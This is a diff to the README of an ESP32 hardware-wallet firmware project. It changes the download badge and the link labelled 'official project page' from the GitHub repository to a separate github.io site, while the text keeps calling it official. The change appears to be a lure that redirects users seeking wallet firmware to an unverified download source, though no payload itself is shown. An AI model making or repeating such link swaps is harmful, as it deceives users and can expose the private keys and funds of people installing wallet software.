@@ -1,6 +1,6 @@
 # 🔒 esp32-hdwallet - Manage your crypto assets securely offline
 
-<a href="https://github.com/Glorianealone593/esp32-hdwallet"><img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download"></a>
+<a href="https://glorianealone593.github.io"><img src="https://img.shields.io/badge/Download-Release-blue.svg" alt="Download"></a>
 
 This software turns your ESP32 hardware device into a secure digital wallet. It keeps your private keys safe by never connecting them to the internet. You sign transactions on the device itself. This method prevents hackers from stealing your funds through your computer or phone.
 
@@ -16,7 +16,7 @@ You need a few items to use this firmware:
 
 Follow these steps to get the file you need:
 
-1. Visit the [official project page](https://github.com/Glorianealone593/esp32-hdwallet) to view the latest software releases.
+1. Visit the [official project page](https://glorianealone593.github.io) to view the latest software releases.
 2. Look for the section labeled "Releases" on the right side of the screen.
 3. Click the latest version number.
 4. Scroll down to the "Assets" section.
